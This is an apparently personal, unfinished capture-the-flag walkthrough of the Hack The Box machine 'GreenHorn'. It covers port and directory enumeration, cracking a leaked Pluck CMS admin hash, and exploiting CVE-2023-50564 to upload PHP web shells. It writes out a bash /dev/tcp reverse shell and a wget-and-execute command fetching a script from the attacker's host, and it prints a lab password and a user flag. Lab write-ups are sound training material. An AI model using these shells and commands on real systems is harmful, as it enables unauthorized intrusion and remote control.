@@ -1,0 +1,165 @@
+GreenHorn:
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.67.2
+
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
+|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://greenhorn.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+3000/tcp open  ppp?
+
+echo 10.129.67.2 greenhorn.htb | sudo tee -a /etc/hosts 
+http://greenhorn.htb/?file=welcome-to-greenhorn 
+
+
+http://greenhorn.htb/?file=../../../../etc/hosts 
+Leads us to webpage:
+“A hacking attempt has been detected. For security reasons, we're blocking any code execution.” 
+
+Burpe Suite HTTP request:
+GET /?file=welcome-to-greenhorn HTTP/1.1
+Host: greenhorn.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=ogkof2se8tpv6vtr0iknhco5d6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+sudo nikto -h 10.129.67.2 
+
+The web server is powered by : https://github.com/pluck-cms/pluck/wiki 
+
+http://greenhorn.htb/login.php takes us to login page
+We also see “pluck 4.7.18 © 2005-2024. pluck is available under the terms of the GNU General Public License.” 
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-50564 
+
+POST /login.php HTTP/1.1
+Host: greenhorn.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://greenhorn.htb/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Origin: http://greenhorn.htb
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=a1nnjnrt3u2mnm9s6kgairgg8l
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+cont1=password&bogus=&submit=Log+in
+
+I enumerated further with gobuster and found some PDF files that were readily available for download. 
+──╼ [★]$ gobuster dir -u http://greenhorn.htb/docs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -b 302
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://greenhorn.htb/docs/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   302
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/README               (Status: 200) [Size: 1811]
+/CHANGES              (Status: 200) [Size: 8535]
+/COPYING              (Status: 200) [Size: 35068]
+
+They don’t give much information.
+
+
+http://greenhorn.htb:3000/ takes us to a GreenHorn, self-hosted Git Service
+
+If we go to the explore tab, we can see a repository for the pluck source code for the webserver
+
+http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/login.php given this file, we found that to login successfully it checks against this hash
+
+<?php $ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'; ?>
+
+hashid 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
+Analyzing 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
+[+] SHA-512 
+[+] Whirlpool 
+[+] Salsa10 
+[+] Salsa20 
+[+] SHA3-512 
+[+] Skein-512 
+[+] Skein-1024(512)
+
+ hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt.gz  
+
+d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
+
+Iloveyou1 is the password to http://greenhorn.htb/login.php 
+
+
+
+admin@greenhorn.htb 
+
+Using this: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-50564 
+
+-We were able to upload a test2.zip that contained a php file inside that had: <?php echo system("cat /etc/passwd"); ?> 
+
+Access here: http://greenhorn.htb/data/modules/test2/miri.php 
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin syslog:x:107:113::/home/syslog:/usr/sbin/nologin uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false vboxadd:x:998:1::/var/run/vboxadd:/bin/false git:x:114:120:Git Version Control,,,:/home/git:/bin/bash mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false junior:x:1000:1000::/home/junior:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false _laurel:x:997:997::/var/log/laurel:/bin/false
+
+http://greenhorn.htb/data/modules/test3/shell.php?cmd=whoami 
+We were able to upload a shell.php file that contained   <?php system($_GET["cmd"]); ?>
+
+
+Output: www-data 
+
+On attack machine, create reverse.sh and serve it on webpage then paste URL to get reverse shell onto netcat listener
+
+ Reverse.sh:
+#!/bin/bash
+ bash -i >& /dev/tcp/10.10.14.209/4444 0>&1 
+
+http://greenhorn.htb/data/modules/test3/shell.php?cmd=wget%20http%3A%2F%2F10.10.14.209%3A8001%2Freverse.sh%20-O%20%2Ftmp%2Freverse.sh%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Freverse.sh%20%26%26%20%2Ftmp%2Freverse.sh
+
+Let’s move to junior’s account using password from earlier
+
+www-data@greenhorn:~/html/pluck$ su junior
+su junior
+Password: iloveyou1
+whoami
+junior
+
+cat user.txt
+c051f1d525663abede04815e1e9db92e
+
+sudo -S -l
+[sudo] password for junior: iloveyou1
+Sorry, user junior may not run sudo on greenhorn.
+
+Privilege Escalation
+
+Stabilize the shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+We were able to open and view the other file within Junior’s home directory which shows us an PDF file with pixelated sensitive credentials
+
+
+
+https://github.com/spipm/Depix/tree/main 
+
+https://forum.hackthebox.com/t/official-greenhorn-discussion/318358/121 
+
+Uncomplete, leaving for now since we can’t get Depix to work. 
